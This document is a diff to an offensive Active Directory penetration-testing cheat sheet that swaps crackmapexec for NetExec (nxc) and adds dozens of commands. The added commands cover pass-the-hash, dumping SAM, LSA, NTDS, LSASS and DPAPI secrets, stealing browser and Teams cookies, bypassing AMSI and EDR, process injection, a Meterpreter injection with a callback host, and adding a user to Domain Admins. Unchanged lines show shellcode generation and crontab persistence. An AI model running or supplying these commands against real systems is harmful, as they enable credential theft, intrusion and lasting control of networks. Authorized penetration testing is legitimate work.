@@ -11,7 +11,7 @@ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tc
 
 impacket-lookupsid anonymous@'$IP' # enumerate users
 
-crackmapexec smb $IP -u 'guest' -p '' --rid-brute  # enumerate users
+nxc smb $IP -u 'guest' -p '' --rid-brute  # enumerate users
 
 gpp-decrypt PASSWORDHASH    # GPP (GROUP POLICY PREFERENCES/ PASSWORD ATTACKS)
 
@@ -65,33 +65,88 @@ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt # asreproast
 
 impacket-GetUserSPNs 'domain/user:password' -dc-ip $IP -request # kerberoasting
 
+# SMB NXC
+nxc IP/24 -u USER -d DOMAIN -p PASSWD 	# pass the creds
+nxc IP/24 -u "USER" -H HASH --local 	# pass the hash
+nxc smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth  # Connect to target using local account
+nxc smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth   # Pass the hash against a subnet
+nxc smb 172.16.157.0/24 -u administrator -H 'NTHASH'   # Pass the hash against a subnet
+nxc smb 192.168.215.104 -u 'user' -p 'PASS' --users    # Enumerate users
+nxc smb 192.168.215.104 -u 'user' -p 'PASS' --local-users  # Enumerate local users
+nxc smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares      # Enumerate available shares
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE	# filter only by readable or writable share
+nxc smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol    # Get the password policy
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'   # Execute command through cmd.exe (admin privileges required)
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec     # Force the smbexec method
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'       # Execute commands through PowerShell (admin privileges required)
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam        # Dump local SAM hashes
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable     # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable        # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'    # But you can force the logoff
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'   # But you can force the logoff
+nxc smb -M mimikatz --module-info      # Module information
+nxc smb -M mimikatz --options      # View module options
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz       # Mimikatz module
+nxc smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'       # Mimikatz module
+nxc smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444     # # Met_Inject module
+nxc smb <ip> -u user -p pass -M enum_av		# Enumerate antivirus installed
+nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt		# Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --smb-sessions		# Enumerate active SMB sessions (including RPC/DCOM over named pipes)
+nxc smb 192.168.56.11 -u USERNAME -p 'PASSWORDHERE' --interfaces	# Enumerate network interfaces
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks	# Enumerate disks
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users	# Enumerate logged users on the remote target
+nxc smb 192.168.1.101 -u user.txt -p user.txt --no-bruteforce --continue-on-success	# Checking 'username == password' using wordlist
+nxc smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-success		# Checking one login equal one password using wordlist
+nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator 	# If you have an object with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to an account you control you can use the impersonate flag inside NetExec to automatically execute the Resource Based Constrained Delegation and impersonate any user
+nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self	# If you have a computer account you can (nearly) always get local administrator with the s4u2self extension
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'	# execute PowerShell commands
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload		# Bypass AMSI
+nxc <IP> -u username -p password -M pi -o PID=<target_process_pid> EXEC=<command>		# Process Injection method to execute commands with the privileges of the target user (requires SYSTEM privileges)
+nxc SMB <IP> -u USER -p PASSWORD --spider C\$ --pattern txt	# Spider the C drive for files with txt in the name or extension
+nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus		# List all readable files
+nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True	# Dumping All Files
+nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt		# Send a local file to the remote target
+nxc smb 172.16.251.152 -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt		# Get a remote file on the remote target
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam	# Dump SAM hashes using methods from secretsdump.py
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump		# Dump SAM hashes using methods from secretsdump.py
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa		# Dump LSA secrets using methods from secretsdump.py
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa secdump 	# Dump LSA secrets using methods from secretsdump.py
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds		# Dump the NTDS.dit from target DC
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss		# Dump the NTDS.dit from target DC | Uses the Volume Shadow copy Service
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil		# will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py
+nxc smb 192.168.255.131 -u administrator -p pass -M lsassy  		# dump the credentials remotely
+nxc smb 192.168.255.131 -u administrator -p pass -M nanodump		# dump the credentials remotely
+nxc smb <ip> -u user -p password --dpapi		# Dump DPAPI credentials
+nxc smb <ip> -u user -p password --dpapi cookies	# Dump DPAPI credentials | Collect every cookies in browsers
+nxc smb <ip> -u user -p password --dpapi nosystem	# Dump DPAPI credentials | Won't collect system credentials. This will prevent EDR from stopping you from looting passwords
+nxc smb <ip> -u user -p password --local-auth --dpapi nosystem 	# Dump DPAPI credentials
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm	# Dump the SCCM from target using methods from dploot
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm disk	# Dump the SCCM from target using methods from dploot
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm wmi	# Dump the SCCM from target using methods from dploot
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam	# Dump access token for Azure and Microsoft 365 from Token Broker Cache
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --mkfile masterkeys.txt # Dump access token for Azure and Microsoft 365 from Token Broker Cache
+nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --pvk domain_backup_key.pvk	# Dump access token for Azure and Microsoft 365 from Token Broker Cache
+nxc smb <ip> -u user -p pass -M wifi	# Dump WIFI password
+nxc smb <ip> -u user -p pass -M keepass_discover	# Dump KeePass 1
+nxc smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"	# Dump KeePass 2
+nxc smb 192.168.56.22 -u eddard.stark -p FightP3aceAndHonor! -M veeam	# Dump passwords used by Veeam for backup jobs
+nxc smb 192.168.56.24 -u eddard.stark -p FightP3aceAndHonor! -M winscp 	# Dump WinSCP Credentials stored in the registry or local files
+nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M putty	# Dump private Keys stored for authentication or stored proxy credentials
+nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M vnc	# Dump VNC password from RealVNC or TightVNC
+nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M rdcman	# Dump Remote Desktop Connection Manager credentials
+nxc smb <ip> -u user-can-read-laps -p pass --laps	#  If you have compromised an account that can read LAPS password
+nxc smb <ip> -u 'user' -p 'pass' -M spooler	# Checking if the Spooler Service is Running
+nxc smb <ip> -u 'user' -p 'pass' -M webdav	# Checking if the WebDav Service is Running
+nxc smb <ip> -u user -p pass -M teams_localdb	# Steal Microsoft Teams Cookies
+nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users	# Enumerate logged-on users on your Target 1
+nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>	# Execute commands on behalf of other users 2 (Enumerate logged-on users first)
+nxc smb [] -u [] -p [] --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"	# Execute commands on behalf of other users 2 (Enumerate logged-on users first) | CMD: Command to execute | USER:User to execute command as | TASK:OPTIONAL: Set a name for the scheduled task name | FILE:OPTIONAL: Set a name for the command output file | LOCATION :OPTIONAL: Set a location for the command output file
+nxc smb <ip> -u user -p pass -M security-questions	# dump a local user's security questions
 
-crackmapexec IP/24 -u USER -d DOMAIN -p PASSWD 	# pass the creds
-crackmapexec IP/24 -u "USER" -H HASH --local 	# pass the hash
-crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth  # Connect to target using local account
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth   # Pass the hash against a subnet
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'   # Pass the hash against a subnet
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users    # Enumerate users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups      # Enumerate domain groups
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users  # Enumerate local users
-crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares      # Enumerate available shares
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions     # Get the active sessions
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers       # Check logged in users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol    # Get the password policy
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'   # Execute command through cmd.exe (admin privileges required)
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec     # Force the smbexec method
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'       # Execute commands through PowerShell (admin privileges required)
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam        # Dump local SAM hashes
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable     # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable        # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'    # But you can force the logoff
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'   # But you can force the logoff
-crackmapexec smb -M mimikatz --module-info      # Module information
-crackmapexec smb -M mimikatz --options      # View module options
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz      # Mimikatz module
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz       # Mimikatz module
-crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'       # Mimikatz module
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444     # # Met_Inject module
+# LDAP NXC
+
+
+powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"	# Custom command to add a user to the domain admin group for easy copy&pasting
 
 # ZERO LOGON
 
@@ -164,7 +219,7 @@ impacket-dcomexec.py domain/user:password@IP <command>  # A semi-interactive she
 # RDP
 xfreerpd /u:user /p:password /v:$IP # connect RDP with creds
 xfreerpd /u:user /v:$IP /pth:hash:hash # connect RDP with hash
-sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable   # Remotely enable RDP using CrackMapExec
+sudo nxc smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable   # Remotely enable RDP using CrackMapExec
 sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"   # # RDP using mimikatz and PtH
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f    # Enable RDP from cmd.exe
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f    # Disable RDP from cmd.exe
@@ -177,7 +232,7 @@ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Username\AppData\Loc
 
 # EXTRACT HASHES (MUST BE ADMIN)
 
-crackmapexec smb $IP -u 'user' -p 'password' --ntds # dcsync
+nxc smb $IP -u 'user' -p 'password' --ntds # dcsync
 
 impacket-secretsdump domain/user:password@$IP # dcsync
 
@@ -1304,7 +1359,7 @@ lazagne.exe wifi        # Wifi | Opensource | retrieve all the passwords stored
 
 # LAPS
 
-crackmapexec ldap 192.168.1.172 -u administrator -p 'Ignite@123' --kdcHost 192.168.1.172 -M laps    # dump the credentials from LAPS in clear text
+nxc ldap 192.168.1.172 -u administrator -p 'Ignite@123' --kdcHost 192.168.1.172 -M laps    # dump the credentials from LAPS in clear text
 Get-LAPSPasswords -DomainController 192.168.1.172 -Credential IGNITE\Administrator | Format-Table -AutoSize     # # dump the credentials from LAPS in clear text
 SharpLAPS.exe /user:IGNITE\Administrator /pass:Ignite@123 /host:192.168.1.172   # dump the credentials from LAPS in clear text   
 
@@ -1444,7 +1499,7 @@ msfvenom -p windows/exec CMD=”cmd.exe /C your_command” -f c # CMD Windows Ex
 msfvenom -p windows/messagebox TEXT=”Message” -f c  # Windows Message Box Shellcode, malware
 targetedkerberoast.py --dc-ip IP -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 # ADCS ENUMERATION | CERTICATES
-﻿certipy-ad find -u ca_svc -p 'Password@1' -target sequel.htb -text -stdout -vulnerable	# adcs enumeration | certificates
+certipy-ad find -u ca_svc -p 'Password@1' -target sequel.htb -text -stdout -vulnerable	# adcs enumeration | certificates
 netexec ldap domain.lab -u username -p password -M adcs 	# adcs enumeration | certificates
 ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName	# adcs enumeration | certificates
 certutil.exe -config - -ping	# adcs enumeration | certificates
@@ -1551,4 +1606,3 @@ echo "@reboot root /path/to/malicious.sh" >> /etc/crontab	# System-wide Cron: Cr
 
 
 # SLIVER
-
